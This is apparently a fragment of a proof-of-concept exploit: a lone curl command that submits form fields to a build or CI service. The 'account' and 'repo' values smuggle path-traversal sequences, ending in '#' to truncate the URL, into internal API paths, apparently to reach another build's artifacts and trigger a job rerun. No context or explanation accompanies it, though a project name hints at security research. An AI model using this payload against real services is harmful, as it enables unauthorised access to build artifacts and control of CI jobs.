curl \
  -F "account=../../api/buildjobs/uwslrubaa7ve8vdq/artifacts/temperature_converter_example%2Fpayload.json?stream=true#" \
  -F "project=libssh2-ethicalhacking" \
  -F "buildid=1337" \
  -F "base=main" \
  -F "hash=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
  -F "repo=../repos/STRUCTiX/libssh2-ethicalhacking/actions/jobs/10239836102/rerun#" \
